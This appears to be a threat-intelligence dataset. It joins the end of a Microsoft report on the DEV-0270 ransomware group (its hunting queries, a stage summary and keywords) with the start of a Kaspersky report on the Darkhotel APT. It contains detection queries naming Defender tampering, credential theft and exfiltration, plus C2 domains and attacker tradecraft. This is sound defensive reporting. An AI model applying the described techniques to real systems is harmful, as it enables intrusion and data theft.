detection. The threat actors typically turn off Microsoft Defender Antivirus real-time protection to prevent Microsoft Defender Antivirus from blocking the execution of their custom binaries. The threat group creates or activates the DefaultAccount account to add it to the Administrators and Remote Desktop Users groups. The modification of the DefaultAccount provides the threat actor group with a legitimate pre-existing account with nonstandard, higher privileges. DEV-0270 also uses powershell.exe to load their custom root certificate to the local certificate database. This custom certificate is spoofed to appear as a legitimate Microsoft-signed certificate. However, Windows flags the spoofed certificate as invalid due to the unverified certificate signing chain. This certificate allows the group to encrypt their malicious communications to blend in with other legitimate traffic on the network.Additionally, DEV-0270 heavily uses native LOLBins to effectively avoid detection. The threat group commonly uses native WMI, net, CMD, and PowerShell commands and registry configurations to maintain stealth and operational security. They also install and masquerade their custom binaries as legitimate processes to hide their presence. Some of the legitimate processes they masquerade their tools as include: dllhost.exe, task_update.exe, user.exe, and CacheTask. Using .bat files and powershell.exe, DEV-0270 might terminate existing legitimate processes, run their binary with the same process name, and then configure scheduled tasks to ensure the persistence of their custom binaries.Lateral movementDEV-0270 has been seen creating defaultaccount and adding that account to the Remote Desktop Users group. The group uses the RDP connection to move laterally, copy tools to the target device, and perform encryption.Along with RDP, Impacket’s WMIExec is a known toolkit used by the group for lateral movement. In multiple compromises, this was the main method observed for them to pivot to additional devices in the organization, execute commands to find additional high-value targets, and dump credentials for escalating privileges.An example of a command using Impacket’s WMIExec from a remote device: becoming inoperable. For workstations, the group uses DiskCryptor, an open-source full disk encryption system for Windows that allows for the encryption of a device’s entire hard drive. The group drops DiskCryptor from an RDP session and when it is launched, begins the encryption. This method does require a reboot to install and another reboot to lock out access to the workstation.The following are DEV-0270’s PowerShell commands using BitLocker:Microsoft will continue to monitor DEV-0270 and PHOSPHORUS activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below. Recommended mitigation stepsThe techniques used by DEV-0270 can be mitigated through the following actions:Apply the corresponding security updates for Exchange Server, including applicable fixes for CVE-2021- 26855, CVE-2021-26858, CVE-2021-26857 and CVE-2021-27065. While it is important to prioritize patching of internet-facing Exchange servers to mitigate risk in an ordered manner, unpatched internal Exchange Server instances should also be addressed as soon as possible.For Exchange Server instances in Mainstream Support, critical product updates are released for the most recently released Cumulative Updates (CU) and for the previous CU. For Exchange Server instances in Extended Support, critical product updates are released for the most recently released CU only. If you don’t have a supported CU, Microsoft is producing an additional series of security updates (SUs) that can be applied to some older and unsupported CUs to help customers more quickly protect their environment. For information on these updates, see March 2021 Exchange Server Security Updates for older Cumulative Updates of Exchange Server. Installing the updates is the only complete mitigation for these vulnerabilities and has no impact on functionality. If the threat actor has exploited these vulnerabilities to install malware, installing the updates does not remove implanted malware or evict the actor.6/10Use Microsoft Defender Firewall, intrusion prevention devices, and your network firewall to prevent RPC and SMB communication among devices whenever possible. This limits lateral movement and other attack activities. Check your perimeter firewall and proxy to restrict or prevent network appliances like Fortinet SSL VPN devices from making arbitrary connections to the internet to browse or download files. Enforce strong local administrator passwords. Use tools like LAPS. Ensure that Microsoft Defender Antivirus is up to date and that real-time behavior monitoring is enabled. Keep backups so you can recover data affected by destructive attacks. Use controlled folder access to prevent unauthorized applications from modifying protected files. Turn on the following attack surface reduction rules to block or audit activity associated with this threat:Block credential stealing from the Windows local security authority subsystem (lsass.exe) Block process creations originating from PsExec and WMI commands Block persistence through WMI event subscription. Ensure that Microsoft Defender for Endpoint is up to date and that real-time behavior monitoring is enabledDetection details Microsoft Defender for EndpointAlerts with the following titles in the security center can indicate threat activity on your network:Malware associated with DEV-0270 activity group detectedThe following additional alerts may also indicate activity associated with this threat. These alerts, however, can be triggered by unrelated threat activity and are not monitored in the status cards provided with this report.A script with suspicious content was observed A suspicious file was observed Anomalous behavior by a common executable Lazagne post-exploitation tool Local Emails Collected Mimikatz credential theft tool ‘Mimilove’ high-severity malware was prevented New group added suspiciously Ongoing hands-on-keyboard attack via Impacket toolkit Possible Antimalware Scan Interface (AMSI) tampering Possible attempt to discover groups and permissions Possible exploitation of Exchange Server vulnerabilities Possible exploitation of ProxyShell vulnerabilities Possible web shell installationSuspicious file dropped by Exchange Server process Suspicious Modify Registry Suspicious Permission Groups Discovery Suspicious PowerShell command line Suspicious PowerShell download or encoded command execution Suspicious Process Discovery Suspicious process executed PowerShell command Suspicious process launched using dllhost.exe Suspicious ‘PShellCobStager’ behavior was blocked Suspicious Scheduled Task Process LaunchedSuspicious sequence of exploration activities Suspicious ‘SuspExchgSession’ behavior was blocked Suspicious System Network Configuration Discovery Suspicious System Owner/User Discovery7/10Process memory dump Suspicious Account Discovery: Email Account Suspicious behavior by cmd.exe was observed Suspicious behavior by svchost.exe was observed Suspicious behavior by Web server process Suspicious Create Account Suspicious file droppedSuspicious Task Scheduler activity Suspicious User Account DiscoverySuspicious user password change Suspicious w3wp.exe activity in Exchange System file masquerade Tampering with the Microsoft Defender for Endpoint sensor Unusual sequence of failed logons WDigest configuration changeHunting queries Microsoft SentinelMicrosoft Sentinel customers can use the following queries to look for the related malicious activity in their environments.DEV-0270 registry IOCThis query identifies modification of registry by DEV-0270 actor to disable security feature as well as to add ransom notes:url 0270RegistryIOCSep2022.yamlDEV-0270 malicious PowerShell usageDEV-0270 heavily uses PowerShell to achieve their objective at various stages of their attack. This query locates PowerShell activity tied to the actor:url 0270PowershellSep2022.yamlDEV-0270 WMIC discoveryThis query identifies dllhost.exe using WMIC to discover additional hosts and associated domains in the environment:url 0270WMICDiscoverySep2022.yamlDEV-0270 new user creationThis query tries to detect creation of a new user using a known DEV-0270 username/password schema:url 0270NewUserSep2022.yamlMicrosoft 365 Defender8/10To locate possible actor activity, run the following queries.Disable services via registry Search for processes modifying the registry to disable security features. GitHub link DeviceProcessEvents | where InitiatingProcessCommandLine has_all(@’”reg”’, ‘add’, @’”HKLM\SOFTWARE\Policies\’, ‘/v’,’/t’, ‘REG_DWORD’, ‘/d’, ‘/f’) and InitiatingProcessCommandLine has_any(‘DisableRealtimeMonitoring’, ‘UseTPMKey’, ‘UseTPMKeyPIN’, ‘UseAdvancedStartup’, ‘EnableBDEWithNoTPM’, ‘RecoveryKeyMessageSource’)Modifying the registry to add a ransom message notificationIdentify registry modifications that are indicative of a ransom note tied to DEV-0270. GitHub link DeviceProcessEvents | where InitiatingProcessCommandLine has_all(‘”reg”’, ‘add’, @’”HKLM\SOFTWARE\Policies\’, ‘/v’,’/t’, ‘REG_DWORD’, ‘/d’, ‘/f’, ‘RecoveryKeyMessage’, ‘Your drives are Encrypted!’, ‘@’)DLLHost.exe file creation via PowerShellIdentify masqueraded DLLHost.exe file created by PowerShell. GitHub link DeviceProcessEvents | where InitiatingProcessFileName =~ ‘powershell.exe’ | where InitiatingProcessCommandLine has_all(‘$file=’, ‘dllhost.exe’, ‘Invoke- WebRequest’, ‘-OutFile’)Add malicious user to Admins and RDP users group via PowerShellLook for adding a user to Administrators in remote desktop users via PowerShell. GitHub link DeviceProcessEvents | where InitiatingProcessFileName =~ 'powershell.exe' | where InitiatingProcessCommandLine has_all('$admins=', 'System.Security.Principal.SecurityIdentifier', 'Translate', '-split', 'localgroup', '/add', '$rdp=')Email data exfiltration via PowerShellIdentify email exfiltration conducted by PowerShell. GitHub link DeviceProcessEvents | where FileName =~ 'powershell.exe' | where ProcessCommandLine has_all('Add-PSSnapin', 'Get-Recipient', '- ExpandProperty', 'EmailAddresses', 'SmtpAddress', '-hidetableheaders')Create new user with known DEV-0270 username/password Search for the creation of a new user using a known DEV-0270 username/password schema. GitHub link9/10DeviceProcessEvents | where InitiatingProcessCommandLine has_all('net user', '/add') | parse InitiatingProcessCommandLine with * ""user "" username "" ""* | extend password = extract(@""\buser\s+[^\s]+\s+([^\s]+)"", 1, InitiatingProcessCommandLine) | where username in('DefaultAccount') or password in('P@ssw0rd1234', '_AS_@1394')PowerShell adding exclusion path for Microsoft Defender of ProgramDataIdentify PowerShell creating an exclusion path of ProgramData directory for Microsoft Defender to not monitor. | where FileName =~ ""powershell.exe"" and ProcessCommandLine has_all(""try"", ""Add- MpPreference"", ""-ExclusionPath"", ""ProgramData"", ""catch"")DLLHost.exe WMIC domain discoveryIdentify dllhost.exe using WMIC to discover additional hosts and associated domain. GitHub link DeviceProcessEvents | where InitiatingProcessFileName =~ ""dllhost.exe"" and InitiatingProcessCommandLine == ""dllhost.exe"" | where ProcessCommandLine has ""wmic computersystem get domain""10/10 ","1. Initial Access - Gain access by exploiting vulnerabilities like ProxyLogon in Exchange or CVE-2018-13379 in Fortinet devices. 2. Discovery - Use LOLBins like WMI and PowerShell to learn about the environment and identify valuable targets. 3. Credential Access - Enable WDigest registry key to store credentials in cleartext, then use rundll32 and MiniDump to dump LSASS and steal credentials. 4. Persistence - Create accounts like DefaultAccount, enable RDP, and use scheduled tasks to maintain access. 5. Privilege Escalation - Dump credentials to obtain higher privileges, create/modify accounts, and masquerade binaries. 6. Defense Evasion - Disable security services, use LOLBins, spoof certificates, and masquerade tools to avoid detection. 7. Lateral Movement - Use RDP and WMIExec to pivot to other systems on the network. 8. Impact - Use BitLocker and DiskCryptor to encrypt devices and demand ransom. Threaten to leak data if ransom isn't paid. ",valid_42,"['initial access', 'vulnerabilities', 'ProxyLogon', 'Exchange', 'CVE-2018-13379', 'Fortinet', 'devices', 'discovery', 'LOLBINs', 'PowerShell', 'the environment', 'credential access', 'WDigest', 'registry', 'credentials', 'cleartext', 'rundll32', 'MiniDump', 'LSASS', 'accounts', 'defaultaccount', 'RDP', 'scheduled tasks', 'privilege escalation', 'higher privileges', 'masquerade', 'Security', 'tools', 'detection', 'lateral movement', 'WMIExec', 'other systems', 'the network', 'BitLocker', 'DiskCryptor', 'ransom', 'data']",initial access; vulnerabilities; ProxyLogon; Exchange; CVE-2018-13379; Fortinet; devices; discovery; LOLBINs; PowerShell; the environment; credential access; WDigest; registry; credentials; cleartext; rundll32; MiniDump; LSASS; accounts; defaultaccount; RDP; scheduled tasks; privilege escalation; higher privileges; masquerade; Security; tools; detection; lateral movement; WMIExec; other systems; the network; BitLocker; DiskCryptor; ransom; data.
"The DarkhoTel aPT A SToRy of UNUSUAl HoSpiTAliTyVersion 1.0 November, 2014Global Research and Analysis Team2Contents Executive Summary 3introduction 4Analysis 5 Delivery - Hotels/Business Centers and indiscriminate Spread 5 Hotels and Business Centers Spread 5 Abusing Network infrastructure 6 indiscriminate Spread 7 Darkhotel Spear-phishing Campaigns 8 Recent 0-day Deployment 9 Digital Certificates and Delegitimizing Certificate Authority Trust 9 Cracking the keys 12 other Tapaoux Certificates 12 Enhanced Keyloggers and Development 13 Keylogger Code 13interesting Malware Components 15 Small Downloader 15 information Stealer 16 Trojan.Win32.Karba.e 17 Trojan-Dropper & injector (infected legitimate files) 17 Selective infector 18 Campaign Codes 18infrastructure and Victims 19 Sinkhole Domains 19 Victim locations - KSN and Sinkhole Data 20 KSN Data 20 Sinkhole Data 22 Available ddrlog Victim Data 22 C2 Communications and Structure 24 Victim Management 25 Researcher Activity 26Conclusions 273Executive Summary The Darkhotel ApT is a threat actor possessing a seemingly inconsistent and con- tradictory set of characteristics, some advanced and some fairly rudimentary. in- hospitably operating for almost a decade, the threat actor is currently active. The actor’s offensive activity can be tied to specific hotel and business center Wi-fi and physical connections, some of it is also tied to p2p/file sharing networks, and they have been known to spear-phish targets as well. Darkhotel tools are detected as “Tapaoux”, “pioneer”, “Karba”, and “Nemim”, among other names. The following list presents a set of characteristics for the crew: • operational competence to compromise, mis-use, and maintain access toglobal scale, trusted commercial network resources with strategic precision for years• advanced mathematical and crypto-analytical offensive capabilities, alongwith no regard for undermining the trust extended to the Certificate Authorities and the pKi indiscriminately infect systems with some regional clarity over trusted and untrusted resources to build and operate large botnets•• well-developed low level keyloggers within an effective and consistent toolset • a focus throughout campaigns on specific victim categories and tagging them • a larger, dynamic infrastructure built of apache webservers, dynamic dnsrecords, crypto libraries, and php webapps• regular 0-day access - recent deployment of an embedded Adobe flash 0-day spear-phishing exploit, and infrequent deployment of other 0-day resources to sustain larger campaigns over several years4introduction When unsuspecting guests, including situationally aware corporate executives and high-tech entrepreneurs, travel to a variety of hotels and connect to the internet, they are infected with a rare ApT Trojan posing as any one of several major software releases. These might be GoogleToolbar, Adobe flash, Windows Messenger, etc. This first stage of malware helps the attackers to identify more significant victims, leading to the selective download of more advanced stealing tools. At the hotels, these installs are selectively distributed to targeted individuals. This group of attackers seems to know in advance when these individuals will arrive and depart from their high-end hotels. So, the attackers lay in wait until these travelers arrive and connect to the internet. The fBi issued advisories about similar hotel incidents; Australian government offi- cials produced similar, newsworthy accounts when they were infected. While an fBi announcement related to attacks on hotel guests overseas appeared in May 2012, related Darkhotel samples were already circulating back in 2007. And available Darkhotel server log data records connections as early as Jan 1, 2009. Addition- ally, seeding p2p networks with widely spread malware and 0-day spear-phishing attacks demonstrate that the Darkhotel ApT maintains an effective toolset and a long-running operation behind the questionable hospitality it shows its guests.5Analysis Delivery - Hotels/Business Centers and indiscriminate Spread Hotels and Business Centers Spread The Darkhotel ApT’s precise malware spread was observed in several hotels’ networks, where visitors connecting to the hotel’s Wi-fi were prompted to install software updates to popular software packages.of course, these packages were really installers for Darkhotel ApT’s backdoors, added to legitimate installers from Adobe and Google. Digitally signed Darkhotel backdoors were installed alongside the legitimate packages.The most interesting thing about this delivery method is that the hotels require guests to use their last name and room number to login, yet only a few guests received the Darkhotel package. When visiting the same hotels, our honeypot research systems couldn’t attract a Darkhotel attack. This data is inconclusive, but it points to misuse of check-in information.6Abusing Network infrastructure The Darkhotel actor maintained an effective intrusion set at hotel networks, providing ample access to unexpected points of attack over several years. These staging points also provide the attackers with access to check-in/check-out and identity information of visitors to high-end and luxury hotels. As a part of an ongoing investigation, our research led us to embedded iframes within hotel networks that redirected individuals’ web browsers to phony install- ers. The attackers were very careful with the placement of these iframes and executables on trusted resources - the hotels’ network login portals themselves. The attackers were also very careful to immediately delete all traces of their tools as soon as an attack was carried out successfully. Those portals are now reviewed, cleaned and undergoing a further review and hardening process. We observed traces of a couple of these incidents in late 2013 and early 2014 on a victim hotel’s network. The attackers set up the environment and hit their individual targets with precision. As soon as their target’s stay was over and the attack-frame was closed, the attackers deleted their iframe placement and backdoored executables from the hotel network. The attackers successfully de- leted traces of their work from earlier attacks in another hotel, but their offensive techniques were the same. outside reports of the same activity at other hotels provide enough data to confirm the same careful operations there. The attack technique blurs the line between a couple of common ApT tactics; fairly inaccurate “watering holes” or “strategic web compromises” and more accurate spearphishing techniques. in this case, the Darkhotel attackers wait for their victim to connect to the internet over the hotel Wi-fi or the cable in their room. There is a very strong likelihood the targets will connect over these resourc- es, and the attackers rely on that likelihood, much like at a watering hole. But the attackers also maintain truly precise targeting information over the victim’s visit, much like they would know a victim’s email address and content interests in a spearphishing attack. While setting up the attack, the Darkhotel attackers knew the target’s expected arrival and departure times, room number, and full name, among other data. This data enables the attackers to present the malicious iframe precisely to that individual target. So, here we have yet another unique characteristic of this attacker - they employ a loosely certain but highly precise offensive approach.7indiscriminate Spread An example of the Darkhotel ApT’s indiscriminate malware spreading is dem- onstrated by the way it seeds Japanese p2p sharing sites, where the malware is delivered as a part of a large (approximately 900mb) rar archive. The archive is also spread over bittorrent, as detailed below. Darkhotel uses this method to distribute their Karba Trojan. These Japanese archives, translated for Chinese speaking viewers, appear to be sexual in nature, part of an anime sex/military comic scene, exposing the likely interests of potential targets. This Darkhotel package was downloaded over 30,000 times in less than six months. The p2p bittorrent Darkhotel offering is listed here, posted on 2013.11.22. it was spread throughout 2014.(コミック) [] ニセコイ 01 09.rarThis torrent serves up an almost 900 mb file. The rar archive decompresses to a directory full of encrypted zips, the associated decryptor and a password file for decrypting the zips. But what looks like the AxDecrypt.exe decryptor is bound to both the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan. When a user downloads the torrent and decrypts the zip files, the trojan surrepti- tiously is installed and run on the victim system. Catch.exe, detected as Backdoor.Win32.Agent.dgrn, communicates with the fol- lowing Darkhotel command and control servers:microdelta.crabdance.com microyours.ignorelist.com micronames.jumpingcrab.com microchisk.mooo.com microalba.serveftp.com8other examples of this Darkhotel backdoor bound within a shared torrent include adult content Japanese anime and more. There are tens of thousands of down- loads of these individual torrents.“torrent\[hgd][]comic1☆7③+④+⑤+[5.08g][ ][]（！）\\(comic1☆7) [ (りな,  )]  shinogi (カグラ) [] “and“\[hgd][]comic1☆7③+④+⑤+[5.08g][][ ]（！）\”)The associated Darkhotel backdoor was hosted on bittorrent, emule, etc, under a variety of comic names. Examples include comics and anime offerings. Related Darkhotel command and control server domains include:microblo5.mooo.com microyours.ignorelist.com micronames.jumpingcrab.com microchisk.mooo.com microalba.serveftp.comDarkhotel Spear-phishing Campaigns Darkhotel campaigns involving typical spear-phished Tapaoux implants publicly appeared in bits and pieces several times over the past five years. These subproject efforts targeted defense industrial base (DiB), government, and NGo organizations. Email content on topics like nuclear energy and weaponry capabilities was used as a lure. Early accounts were posted on contagio describing attacks on NGo organi- zations and government policy makers. This spear-phishing activity continues into 2014. The attacks follow the typical spear-phishing process and in the past couple of months, exploited systems retrieved downloader executables from web servers like hxxp://office revision.com/update/files22/update.exe or hxxp://trade inf.com/mt/ duspr.exe over the past few years the group has emailed links that redirect targets’ brows- ers to internet Explorer 0-day exploits. Sometimes the attachment itself includes an Adobe 0-day exploit.9Recent 0-day Deployment This crew occasionally deploys 0-day exploits, but burns them when required. in the past few years, they deployed 0-day spear-phishing attacks targeting Adobe products and Microsoft internet Explorer, including cve 2010 0188. in early 2014, our researchers exposed their use of cve 2014 0497, a flash 0-day described on Securelist in early february. The crew spear-phished a set of target systems connected to the internet through Chinese iSps, and developed capabilities within the 0-day exploits to handle hardened Windows 8.1 systems. it’s interesting that the flash objects were embedded in Korean documents titled “list of the latest Japanese AV wind and how to use torrents.docx” (loose English translation). The dropped downloader “information Stealer” component functionality summarized below, and detailed in Appendix D.Digital Certificates and Delegitimizing Certificate Authority Trust The Darkhotel actors typically sign their backdoors with digital certificates of one kind or another. However, the certificates originally chosen by this crew are very interesting because of their weak keys and likely abuse by attackers. Here is a listing of the certs that were commonly used to sign Darkhotel malcode, requiring advanced mathematical capabilities to factorize the keys at the time. They are not the only certificates used by the group. More recent activity suggests that the group has stolen certificates to sign their code.Ca root Digisign Server iD (Enrich)owner flexicorp.jaring.my sha1/ RSA (512 bits)Status ExpiredValid From 12/17/2008Valid To 12/17/2010Cybertrust SureServer CAinpack.syniverse.my sha1/RSA (512 bits)Revoked2/13/20092/13/2011Cybertrust SureServer CAinpack.syniverse.com sha1/RSA (512 bits)Revoked2/13/20092/13/2011Anthem inc Certificate Authahi.anthem.com sha1/ RSA (512 bits)invalid Sig.1/13/20101/13/201110Ca root CA 5Digisign Server iD sha1/RSA (512 bits) payments.bnm.gov.m y sha1/RSA (512 bits)TaiCA Secure CAesupplychain.com.tw sha1/RSA (512 bits)Status RevokedValid From 10/20/2008Valid To 10/25/2009invalid Sig.12/7/200912/7/2010Expired7/2/20107/17/2011GTE CyberTrustDigisign Server iD (Enrich)mcrs2.digicert.com. my sha1/RSA (512 bits)invalid Sig3/28/20103/28/2012Cybertrust SureServer CAagreement.syniverse. com sha1/RSA (512 bits)invalid Sig2/13/20092/13/2011Cybertrust SureServer CAEquifax Secure eBusiness CA 1ambermms.syniverse. com sha1/RSA (512 bits) secure.hotelreykjavik.i s md5/RSA (512 bits)invalid Sig.2/16/20092/16/2011invalid Sig2/27/20053/30/2007Cybertrust Educational CAstfmail.ccn.ac.uk sha1/ RSA (512 bits)invalid Sig.11/12/200811/12/2011Digisign Server iD (Enrich)webmail.jaring.my sha1/ RSA (512 bits)invalid Sig6/1/20096/1/2011GTE Educational CADigisign Server iD (Enrich)Anthem inc Educational CAVerisignVerisign Class 3 Secure ofX CA G3Root Agency Root Agencyskillsforge.londonmet. ac.uk sha1/RSA (512 bits) anjungnet.mardi.gov. my sha1/RSA (512 bits)dl ait middleware@an them.com sha1/RSA (512 bits) ad idmapp.cityofbrist ol.ac.uk sha1/RSA (512 bits) secure2.eecu.com sha1/ RSA (512 bits)Microsoft md5/RSA (1024 bits)invalid Sig1/16/20091/16/2012invalid Sig9/29/20099/29/2011invalid Sig4/22/20094/22/2010invalid Sig9/11/20089/11/2011invalid Sig10/25/200910/26/2010invalid Sig6/9/200912/31/203911Ca root sha1/RSA (512 bits)Status invalid SigValid From 2/17/2009Valid To 2/17/2011All related cases of signed Darkhotel malware share the same Root Certificate Authority and intermediate Certificate Authority that issued certificates with weak md5 keys (RSA 512 bits). We are confident that our Darkhotel threat actor fraudulently duplicated these certificates to sign its malware. These keys were not stolen. Many of the certificates were noted in a 2011 fox iT post “RSA 512 Certificates Abused in the Wild”. To further support this speculation please note the non specific Microsoft Security Advisory below, the Mozilla advisory addressing the issue at the time, and the Entrust responses. from Microsoft’s security advisory from Thursday, November 10, 2011: “Microsoft is aware that DigiCert Sdn. Bhd, a Malaysian subordinate certifica- tion authority (CA) under Entrust and GTE CyberTrust, has issued 22 certifi- cates with weak 512 bit keys. These weak encryption keys, when broken, could allow an attacker to use the certificates fraudulently to spoof content, perform phishing attacks, or perform man in the middle attacks against all Web browser users including users of internet Explorer. While this is not a vulnerability in a Microsoft product, this issue affects all supported releases of Microsoft Windows. There is no indication that any certificates were issued fraudulently. Instead, cryptographically weak keys have allowed some of the certificates to be dupli- cated and used in a fraudulent manner. Microsoft is providing an update for all supported releases of Microsoft Windows that revokes the trust in DigiCert Sdn. Bhd. The update revokes the trust of the following two intermediate CA certificates: Digisign Server iD – (Enrich), issued by Entrust.net Certification Authority (2048) Digisign Server ID (Enrich), issued by GTE CyberTrust Global Root” from Mozilla’s 2011 response: “While there is no indication they were issued fraudulently, the weak keys have allowed the certificates to be compromised. furthermore, certificates from this CA contain several technical issues. They lack an EKU extension specifying their intended usage and they have been issued without revocation information.”12from Entrust’s response: “There is no evidence that the Digicert Malaysia certificate authorities have been compromised.”Cracking the keys Here are some notes on the costs and technical requirements of attacking these certificates. The computing power required to crack and factor an RSA 512 bit key was $5000 and the period of time required was about 2 weeks. (see url blogspot.co.at/2010/03/rsa 512 factoring service two weeks.html) in october 2012, Tom Ritter reported that it would cost about $120 -$150, per- haps even as little as $75. Going even further back, there was much discussion about the technical meth- ods of cracking these keys: DJ Bernstein’s 2001 paper on building a machine reducing the cost of integer factorization with Number field Sieve techniques, breaking 1024 bit RSA keys. RSA’s reaction and 2002 statement on whether or not 1024 bit RSA keys are broken: “NiST offered a table of proposed key sizes for discussion at its key man- agement workshop in November 2001 [7]. for data that needs to be protected no later than the year 2015, the table indicates that the RSA key size should be at least 1024 bits. for data that needs to be protected longer, the key size should be at least 2048 bits.”other Tapaoux Certificates Recent Tapaoux attacks and backdoors include malware signed with strong SHA1/RSA 2048 bit certificates, suggesting certificate theft.Ca root Root CAthawtethawte primary Technology Co.,ltd. sha1/RSA (2048bits)Ningbo Gaoxinqu zhidian Electric power Technology Co., ltd. sha1/RSA (2048bits)Status RevokedValid From 7/18/2013Valid To 7/16/2014Revoked11/5/201311/5/201413Enhanced Keyloggers and Development one of the most interesting components that we discovered as a part of this cam- paign was the use of a digitally signed advanced keylogger. it is clean, well written, kernel level malcode. The languages of its strings are a mix of English and Korean. it is signed with the familiar “belinda.jablonski@syniverse.com” digital certificate. This keylogger is dropped by code running within svchost.exe on WinXp Sp3, which maintains an interesting debug string: d:\KerKey\KerKey(일반)\KerKey\release\KerKey.pdb Note 일반 means “General” in Korean it probably was developed as a part of a mid-to-late 2009 project: e:\project\2009\x\total_source\32bit\ndiskpro\src\ioman.cKeylogger Code This driver package is built to resemble a legitimate low-level Microsoft system device. it is installed as a system kernel driver “Ndiskpro” service, described as a “Microcode Update Device”. it is slightly surprising that no rootkit functionality hides this service:When loaded, the NDiSKpRo.SyS driver hooks both iNT 0x01 and iNT 0xff, and retrieves keystroke data directly from port 0x60, the motherboard keyboard con- troller itself. it buffers, then communicates logged user data to the running user mode component. This component then encrypts and writes the retrieved values ondisk to a randomly named .tmp, file like ffffz07131101.tmp. This file is located in the same directory as the original dropper, which maintains persistence across reboots with a simple addition to the HKCU run key.14This keylogger module encrypts and stores gathered data in a log file, as men- tioned previously. its encryption algorithm is similar to RC4. The interesting part is that the module randomly generates the key and stores it in an unexpected place: in the middle of the log file name. Hence, the numeric part of the filename is used as a seed for the pseudorandom number generator. The rand function is statically linked to ensure same results on different computers.15interesting Malware Components The Darkhotel toolset consists of multiple components that have been slightly modified over time. These tools are dropped by hotel installers spoofing legiti- mate software installers, bound within torrent bundles, or dropped by exploits or hypertext linked from spear-phishing emails. More advanced tools, like the keylogger decribed above, are later downloaded to the victim system by one of these implants. in a recent case, word docs embed- ded with 0-day flash swf files either dropped these backdoors or downloaded and executed backdoors from remote web servers. These tools pull down the keylog- ger, steal information from the system, or download other tools. • dropper and selfi njector • selective infector The most interesting behaviors of these components include • highly unusual conditional 180 day command and control communicationsdelayinfostealer module internet Explorer, firefox, and Chrome support• self kill routines when the system default codepage is set to Korean • enhanced Microsoft intelliform authentication theft handling • • campaign or stage iD maintenance • virtual machine execution sensitivity • selective viral infection routines to focus the spread of malware within organi-zations• signed malcode (previously noted)Small Downloader This module is quite small (27Kb) and comes as a part of WinRar SfX file that drops and starts the module from %AppDATA%\Microsoft\Crypto\DES64v7\msieckc.exe. This module is designed to update malicious components through recurring checks at the C&C server. it is also capable of removing some older components, the names of which are hardcoded in the body of the malware. The module adds autorun registry settings to enable an automatic start during system boot.16one of the most interesting functions of this executable is its unusual delay and persistence. if a special file exists on the system, the module will not start calling back to C&C server until the special file is 180 days old. So, if some other critical malicious component was removed during this period, current module backs up and restores access to the system within 6 months. The component gathers system information and sends it to the Darkhotel com- mand and control servers as detailed in Appendix D.information Stealer This module is relatively large (455Kb) and comes as a part of a WinRar SfX file that drops and starts the module from %AppDATA%\Microsoft\Display\DmaUp3. exe. The main purpose of the module is to collect various secrets stored on a lo- cal system and upload them to Darkhotel command and control servers: • Cached passwords from internet Explorer 6/7/8/9 (Windows protected Storage) • Mozilla firefox stored secrets (<12.0) • Chrome stored secrets • Gmail Notifier credentials yandexintelliform handled data and credentials: ◦ 126.com email ◦ Mail.comlavabit (encrypted email service now shut down)17fastmail ◦ Gawab (middle eastern email service) yahoo! Japan logins ◦ Microsoft live logins ◦ Google login credentialsThis module is designed to terminate itself on Windows with the system de- fault codepage set to Korean.Trojan.Win32.Karba.e This malware is 220Kb in size. it was built as MfC framework application with a lot of extra calls that should have complicated the analysis of the sample. it mim- ics a GUi desktop application but it does not create any visible windows or dialogs to interact with local users. The Trojan collects data about the system and anti- malware software installed on it, and uploads that data to Darkhotel command and control servers. More technical details are provided in Appendix D.Trojan-Dropper & injector (infected legitimate files) This malware is 63kb in size. it is bound to a variety of other software packages that vary in name, but the host package is consistently detected as “Virus.Win32. pioneer.dx”. it drops the igfxext.exe “selective infector” component to disk and runs it.18Selective infector This component is a virus, and is used to selectively infiltrate into other comput- ers via USB or network shares. first, the virus retrieves all available disks and starting from disk number 4 (D:\) to disk number 20 (Z:\), finds executable files and infects them. The code simply brute forces the list of mapped removable drives. During its infection routine, the infector changes the entrypoint of executable files, creates an .rdat section, and inserts a small loader in the section, then puts its main payload in the overlay. Every infected file has functionality described in Trojan Dropper & injector section, so it can collect information about the comput- er, send it to the C2 and download other Darkhotel components as commanded. observed downloaded components are signed with a familiar expired certificate from www.esupplychain.com.tw, issued by Cybertrust SureServer CA. Again, further technical details are provided in Appendix D.Campaign Codes Almost every backdoor in this set maintains an internal campaign code or id, used in initial c2 communications as described above. Some iDs appear to be related to geographic interests, others do not seem obvious. We gathered a list of Darkhotel campaign iDs shown below. internal iDs and c2 resources overlap across these com- ponents, there is no pattern of distribution according to connectback resources. The most common id is “DEXT87”:DEXT87step2-auto Java5.22C@RNUl-auto dome-down M1Q84K3HNKEX#V1.Q-autoNKstep2-auto pANA(AMB)-autopANA#MERA SoyA#2-auto step2-down-u(UlT)Q5SS@E.S-downVER1.5.1 ViCToRyWiNM#V1.Q19infrastructure and Victims This infrastructure team appears to employ a lesser skillset than top notch campaigns, maintaining weak server configurations with limited monitoring and defensive reactions, and making some simple mistakes. However, they are ef- fective at maintaining a fully available infrastructure to support new and existing infections. overall, victims in our sinkhole logs and KSN data were found across the globe, with the majority in Japan, Taiwan, China, Russia, Korea and Hong Kong.Sinkhole Domains The following C&C domains have been sinkholed and redirected to the Kaspersky autocashhh.hostmefree.org autochecker.myftp.biz autoshop.hostmefree.org autoupdatfreeee.coolwwweb.com dailypatch -rnr2008.net fenraw.northgeremy.info generalemountina.com goathoney.bizjpnspts.biz ncnbroadcasting.reportinside.net neao.biz private.neao.biz reportinside.net self -makeups.com self- makingups.com sourcecodecenter.org support forum.org updatewifis.dyndns -wiki.com20Victim locations - KSN and Sinkhole Data KSN Data our Kaspersky Security Network detected Darkhotel infections across thousands of machines, mostly related to the Darkhotel p2p campaigns. These geolocation estimates probably provide the most accurate picture of where Darkhotel activity is occurring.Here is a pie chart to better visualize the proportions of attack activity throughout the world. As you can see, over 90% of it occurs in the top five countries: Japan, followed by Taiwan, China, Russia and Korea.2122Sinkhole Data Because the operators very actively build up new command and control serv- ers, it is difficult to sinkhole enough domains to get an accurate overall picture of victim system location based on this data. Also, many researcher systems are connected to the sinkholed domains. However, this graph of current sinkhole callbacks presents a low confidence distribution of victim geolocation, with india, Japan, ireland, Korea, China and Taiwan in the top slots. Removing india and ireland, the set more closely matches our KSN data.Available ddrlog Victim Data Many of these c2s maintain a common directory path that serves a ddrlog. The ddrlogs appear to maintain callback data that the attackers want to set aside in error logs. Many of the callback URls have errors, many are from unwanted ip ranges, and others are clearly unwanted researcher sandbox system callbacks. A description of the detailed connectback URl values and their xor/base64 encoding scheme is included in the “interesting Malware Trojan.Win32.Karba.e” technical notes in 